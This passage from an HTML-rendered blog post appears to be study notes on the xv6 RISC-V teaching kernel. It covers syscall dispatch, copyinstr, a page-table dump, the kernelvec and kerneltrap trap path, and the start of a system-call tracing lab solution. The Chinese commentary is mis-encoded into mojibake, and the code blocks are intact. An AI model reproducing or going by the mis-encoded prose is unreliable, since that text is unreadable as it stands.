class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">[SYS_fork]    sys_fork,</span><br><span class="line">[SYS_exit]    sys_exit,</span><br><span class="line">[SYS_wait]    sys_wait,</span><br><span class="line">[SYS_pipe]    sys_pipe,</span><br><span class="line">[SYS_read]    sys_read,</span><br><span class="line">[SYS_kill]    sys_kill,</span><br><span class="line">[SYS_exec]    sys_exec,</span><br><span class="line">[SYS_fstat]   sys_fstat,</span><br><span class="line">[SYS_chdir]   sys_chdir,</span><br><span class="line">[SYS_dup]     sys_dup,</span><br><span class="line">[SYS_getpid]  sys_getpid,</span><br><span class="line">[SYS_sbrk]    sys_sbrk,</span><br><span class="line">[SYS_sleep]   sys_sleep,</span><br><span class="line">[SYS_uptime]  sys_uptime,</span><br><span class="line">[SYS_open]    sys_open,</span><br><span class="line">[SYS_write]   sys_write,</span><br><span class="line">[SYS_mknod]   sys_mknod,</span><br><span class="line">[SYS_unlink]  sys_unlink,</span><br><span class="line">[SYS_link]    sys_link,</span><br><span class="line">[SYS_mkdir]   sys_mkdir,</span><br><span class="line">[SYS_close]   sys_close,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> num;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ç³»ç»Ÿè°ƒç”¨å‚æ•°"><a href="#ç³»ç»Ÿè°ƒç”¨å‚æ•°" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å‚æ•°"></a>ç³»ç»Ÿè°ƒç”¨å‚æ•°</h5><p>å¥½å®¶ä¼™ï¼Œæˆ‘åˆšæœ‰è¿™ä¸ªç–‘é—®ï¼Œä¹¦çš„ä¸‹ä¸€èŠ‚å°±è§£é‡Šè¿™ä¸ªé—®é¢˜ï¼Œç‰›å•Šã€‚</p>
<p>ç³»ç»Ÿæä¾›ä¸‰ä¸ªå‡½æ•°artint,artaddr,artfdä»é™·é˜±å¸§ä¸­æ£€ç´¢ç¬¬<code>n</code>ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°å¹¶ä¸”ä»¥æ•´æ•°ï¼ŒæŒ‡é’ˆï¼Œæˆ–è€…æ–‡ä»¶æè¿°ç¬¦çš„å½¢å¼ä¿å­˜ï¼Œä»–ä»¬éƒ½è°ƒç”¨<code>argraw</code>æ¥æ£€ç´¢ç›¸åº”çš„ä¿å­˜çš„ç”¨æˆ·å¯„å­˜å™¨ã€‚æ¯”å¦‚<code>argstr</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">argstr(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line">argaddr(<span class="keyword">int</span> n, uint64 *ip)</span><br><span class="line">&#123;</span><br><span class="line">  *ip = argraw(n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å†…æ ¸è¦æƒ³è·å¾—ä¸€ä¸ªæ•´æ•°è¿˜è¡Œï¼Œä½†æ˜¯è¦æƒ³è·å¾—ç”¨æˆ·æ€çš„æŸä¸€ä¸ªå­—ç¬¦ä¸²æˆ–è€…æŸä¸€æ®µå†…å­˜çš„å€¼å°±ä¸å¥½åŠäº†ï¼Œå› ä¸ºæ­¤æ—¶å¤„äºå†…æ ¸æ€ï¼Œé¡µè¡¨æ˜¯å†…æ ¸é¡µè¡¨ï¼Œå¹¶ä¸èƒ½è®¿é—®ç”¨æˆ·æ€çš„å†…å­˜ï¼Œå¯ä»¥çœ‹çœ‹xv6æ˜¯å¦‚ä½•å®Œæˆçš„ã€‚</p>
<p><code>copyinstr</code>å‡½æ•°å°±æ˜¯å®Œæˆåœ¨å†…æ ¸æ€ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€æ‹·è´æ•°æ®çš„å‡½æ•°ï¼Œä¼ å…¥çš„å‚æ•°æœ‰è¿›ç¨‹çš„é™·é˜±å¸§ï¼Œå†…æ ¸æ¥æ”¶åœ°å€dstå’Œç”¨æˆ·æ€åœ°å€srcvaä»¥åŠæ‹·è´é‡maxã€‚æˆ‘ç®€è¿°ä¸€ä¸‹åŸç†ï¼Œå°±æ˜¯åˆ©ç”¨ä¼ è¿›æ¥çš„ç”¨æˆ·æ€è™šæ‹Ÿåœ°å€srcvaå’Œè¿›ç¨‹çš„é™·é˜±å¸§å®Œæˆå¯¹è¿™ä¸ªè™šæ‹Ÿåœ°å€æ‰€æ˜ å°„çš„ç‰©ç†åœ°å€<code>pa0</code>çš„æŸ¥è¯¢ï¼ŒæŸ¥è¯¢è¿‡ç¨‹å°±æ˜¯åˆ©ç”¨é™·é˜±å¸§è®°å½•çš„ç”¨æˆ·æ€é¡µè¡¨ï¼Œç„¶åé€šè¿‡è¿™ä¸ªè™šæ‹Ÿåœ°å€æ‰¾åˆ°å¯¹åº”ç‰©ç†åœ°å€è¿”å›ï¼Œåœ¨å†…æ ¸æ€ä¸­ï¼Œç”±äºå†…æ ¸å°†æ‰€æœ‰ç‰©ç†RAMåœ°å€æ˜ å°„åˆ°åŒä¸€ä¸ªå†…æ ¸è™šæ‹Ÿåœ°å€ï¼Œ<code>copyinstr</code>å¯ä»¥ç›´æ¥å°†å­—ç¬¦ä¸²å­—èŠ‚ä»<code>pa0</code>å¤åˆ¶åˆ°<code>dst</code>ï¼ˆè¿™æ®µå…¶å®ä¸æ˜¯å¾ˆç†è§£ï¼Œæˆ‘ä¸ç¡®å®šè¿™ä¸ªpa0åˆ°åº•æ˜¯ä¸æ˜¯ç‰©ç†åœ°å€ï¼Œå¦‚æœæ˜¯çš„è¯<code>copyinstr</code>ç›´æ¥ä½¿ç”¨ç‰©ç†åœ°å€è¿›è¡Œcopy<code>*dst = *p</code>,é‚£å”¯ä¸€çš„è§£é‡Šå°±æ˜¯æ˜ å°„æ˜¯ç›´æ¥æ˜ å°„ï¼Œå³è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€æ˜¯ä¸€ä¸€å¯¹åº”çš„æ‰å¯ä»¥ï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">copyinstr(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(srcva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (srcva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; max)</span><br><span class="line">      n = max;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *p = (<span class="keyword">char</span> *) (pa0 + (srcva - va0));</span><br><span class="line">    <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(*p == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        got_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *dst = *p;</span><br><span class="line">      &#125;</span><br><span class="line">      --n;</span><br><span class="line">      --max;</span><br><span class="line">      p++;</span><br><span class="line">      dst++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(got_null)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡åœ¨qemuä¸‹æ‰“å°é¡µè¡¨å‘ç°ä¼¼ä¹å°±æ˜¯è¿™æ ·çš„,æ˜ å°„äº†ä¸ªå¯‚å¯ğŸ¤¦â€â™€ï¸ï¼Œåœ¨linuxç³»ç»Ÿä¸­å†…æ ¸å¥½æ­¹æ˜¯çº¿æ€§æ˜ å°„æ‰€æœ‰ç‰©ç†åŒºåŸŸï¼Œxv6ç›´æ¥ä¸€å¯¹ä¸€äº†ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000002000000 0000000002000000 0000000000010000 rw-----</span><br><span class="line">000000000c000000 000000000c000000 0000000000001000 rw---ad</span><br><span class="line">000000000c001000 000000000c001000 0000000000001000 rw-----</span><br><span class="line">000000000c002000 000000000c002000 0000000000001000 rw---ad</span><br><span class="line">000000000c003000 000000000c003000 00000000001fe000 rw-----</span><br><span class="line">000000000c201000 000000000c201000 0000000000001000 rw---ad</span><br><span class="line">000000000c202000 000000000c202000 0000000000001000 rw-----</span><br><span class="line">000000000c203000 000000000c203000 0000000000001000 rw---ad</span><br><span class="line">000000000c204000 000000000c204000 0000000000001000 rw-----</span><br><span class="line">000000000c205000 000000000c205000 0000000000001000 rw---ad</span><br><span class="line">000000000c206000 000000000c206000 00000000001fa000 rw-----</span><br><span class="line">0000000010000000 0000000010000000 0000000000002000 rw---ad</span><br><span class="line">0000000080000000 0000000080000000 0000000000007000 r-x--a-</span><br><span class="line">0000000080007000 0000000080007000 0000000000001000 r-x----</span><br><span class="line">0000000080008000 0000000080008000 0000000000005000 rw---ad</span><br><span class="line">000000008000d000 000000008000d000 0000000000004000 rw-----</span><br><span class="line">0000000080011000 0000000080011000 0000000000011000 rw---ad</span><br><span class="line">0000000080022000 0000000080022000 0000000000001000 rw-----</span><br><span class="line">0000000080023000 0000000080023000 0000000000003000 rw---ad</span><br><span class="line">0000000080026000 0000000080026000 0000000007f35000 rw-----</span><br><span class="line">0000000087f5b000 0000000087f5b000 000000000005d000 rw---ad</span><br><span class="line">0000000087fb8000 0000000087fb8000 0000000000001000 rw---a-</span><br><span class="line">0000000087fb9000 0000000087fb9000 0000000000046000 rw-----</span><br><span class="line">0000000087fff000 0000000087fff000 0000000000001000 rw---a-</span><br><span class="line">0000003ffff7f000 0000000087f77000 000000000003e000 rw-----</span><br><span class="line">0000003fffffb000 0000000087fb5000 0000000000002000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure>

<h5 id="ä»å†…æ ¸æ€é™·å…¥"><a href="#ä»å†…æ ¸æ€é™·å…¥" class="headerlink" title="ä»å†…æ ¸æ€é™·å…¥"></a>ä»å†…æ ¸æ€é™·å…¥</h5><p>ä¹¦ä¸­æ¶‰åŠåˆ°äº†è®¡æ•°å™¨ä¸­æ–­çš„å¤„ç†åŠæ³•ï¼Œç”±äºæˆ‘ä¸æ˜¯å¾ˆç†Ÿæ‚‰è®¡æ•°å™¨ä¸­æ–­ï¼Œæ‰€ä»¥æš‚ä¸”ä¸è®¨è®ºè¿™ç§æƒ…å†µï¼Œåœ¨ç¬¬ä¸ƒç« ä¸­ä¼šç³»ç»Ÿçš„å­¦åˆ°ã€‚æˆ‘åªè®¨è®ºä¸€èˆ¬æƒ…å†µä¸‹çš„å†…æ ¸é™·å…¥ã€‚</p>
<p>å†…æ ¸å‘ç”Ÿé™·å…¥çš„è¯åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯è®¾å¤‡ä¸­æ–­ï¼ŒäºŒæ˜¯å†…æ ¸å¼‚å¸¸ï¼Œæ­¤æ—¶æ˜¯å¤„äºå†…æ ¸æ€çš„ï¼Œ<code>stvec</code>å°±æŒ‡å‘äº†<code>kernelvec</code>,ç„¶åå¤„ç†trapä¹Ÿæ˜¯åœ¨å†…æ ¸æ€ï¼Œæ‰€ä»¥ä¸éœ€è¦åˆ‡æ¢é¡µè¡¨äº†ã€‚å¤„ç†æµç¨‹ä¸»è¦æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼š<code>kernelvec</code>-&gt;<code>kerneltrap</code>-&gt;<code>kernelvec</code></p>
<p><strong>kernelvec</strong></p>
<p>æ„æ–™ä¹‹ä¸­åˆæ˜¯risc-væ±‡ç¼–æï¼Œä½†æ˜¯å¤§æ¦‚æ˜¯èƒ½çœ‹æ‡‚çš„ï¼Œkernelvecé¦–å…ˆå¾—æŠŠæ‰€æœ‰çš„å¯„å­˜å™¨å­˜æ”¾åˆ°å½“å‰å†…æ ¸æ ˆçš„æ ˆä¸Šï¼Œæ‰€ä»¥é¦–å…ˆ<code>addi sp.sp,-256</code>å°±æ˜¯<code>sp=sp+(-256)</code>ï¼Œå…ˆæå‡æ ˆçš„å®¹é‡ã€‚ç„¶åæŠŠå¯„å­˜å™¨æ”¾åœ¨è¿™256å®¹é‡çš„æ ˆé‡Œï¼Œ<code>sd ra,0(sp)</code>ç­‰äº<code>*[sp+0]=ra</code>è¿™æ ·çš„å½¢å¼å­˜å‚¨ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦å­˜å‚¨æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œæ˜¯å› ä¸ºåœ¨è°ƒç”¨<code>kerneltrap</code>çš„æ—¶å€™ï¼Œä¼šå› ä¸ºæ—¶é’Ÿä¸­æ–­è€Œè®©å‡ºcpuå¯¼è‡´ä¸¢å¤±å¯„å­˜å™¨ä¿¡æ¯ï¼Œæ‰€ä»¥å¾—è®°å½•ä¸€ä¸‹ï¼Œè®°å½•å®Œå°±æ˜¯è°ƒç”¨<code>kerneltrap</code>äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">        # interrupts and exceptions while in supervisor</span><br><span class="line">        # mode come here.</span><br><span class="line">        #</span><br><span class="line">        # push all registers, call kerneltrap(), restore, return.</span><br><span class="line">        #</span><br><span class="line">.globl kerneltrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        // make room to save registers.</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        // save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">	// call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        // restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld gp, 16(sp)</span><br><span class="line">        // not this, in case we moved CPUs: ld tp, 24(sp)</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        // return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p><strong>kerneltrap</strong></p>
<p>é¦–å…ˆæ˜¯å‚¨å­˜<code>sepc</code>å’Œ<code>sstatus</code>ä¸¤ä¸ªå¯„å­˜å™¨ï¼Œå› ä¸ºå¦‚æœæœ‰æ—¶é’Ÿä¸­æ–­è€Œè°ƒç”¨<code>yield()</code>å‡½æ•°çš„æ—¶å€™ä¼šç ´åä»–ä»¬ï¼Œè¦ä½¿ç ´åäº†ä»–ä»¬trapè¿”å›çš„æ—¶å€™å°±ä¼šå‡ºé—®é¢˜ï¼Œä¿å­˜å®ŒåçœŸæ­£å¤„ç†trapï¼Œå¤„ç†å®Œä¹‹åæ¢å¤<code>sepc</code>å’Œ<code>sstatus</code>ï¼Œç„¶åè¿”å›åˆ°å‡½æ•°<code>kernelvec</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line">  <span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›åˆ°kernelvecä¸­å°±ä¼šç®€å•äº†ï¼Œå°±åˆ©ç”¨æ ˆä¿¡æ¯æ¢å¤é€šç”¨å¯„å­˜å™¨ï¼Œç„¶å<code>addi sp, sp, 256</code>å<code>sret</code>ç»“æŸå†…æ ¸é™·å…¥ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹æ¯”ç”¨æˆ·æ€é™·å…¥è¦ç®€å•å¾ˆå¤šäº†ã€‚</p>
<h5 id="é¡µé¢é”™è¯¯å¼‚å¸¸"><a href="#é¡µé¢é”™è¯¯å¼‚å¸¸" class="headerlink" title="é¡µé¢é”™è¯¯å¼‚å¸¸"></a>é¡µé¢é”™è¯¯å¼‚å¸¸</h5><p>è¿™ä¸ªæš‚æ—¶ä¸çœ‹ï¼Œæ¶‰åŠåˆ°äº†ç¬¬ä¸‰ç« çš„çŸ¥è¯†ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰å­¦ä¹ åˆ°ã€‚</p>
<h4 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h4><p>å°±æ˜¯å¢åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¿½è¸ªçš„åŠŸèƒ½ï¼Œå¯ä»¥å…ˆåˆ©ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨è®¾ç½®è‡ªå·±æƒ³è¦è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åè¿™ä¸ªç¨‹åºä»¥åŠå­ç¨‹åºåœ¨è°ƒç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™éƒ½ä¼šæ‰“å°ç›¸åº”æ•°æ®ã€‚</p>
<p>ç¼–ç¨‹ä¸æ˜¯éš¾ç‚¹ï¼Œéš¾ç‚¹å¯èƒ½æ˜¯ç†æ¸…æ¥šç³»ç»Ÿè°ƒç”¨çš„åŸç†ä»¥åŠå¯¹åº”çš„å‡ ä¸ªcæ–‡ä»¶å°±å¥½äº†ï¼Œåªè¦é˜…è¯»è¿‡ä¹¦ç±çš„ç¬¬å››ç« é—®é¢˜å°±ä¸å¤§çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trace_printf_sysname</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> mask=p-&gt;trace_num;</span><br><span class="line">  <span class="keyword">int</span> sys_num=p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(mask&amp;(<span class="number">1</span>&lt;&lt;sys_num))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[sys_num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64</span></span><br><span 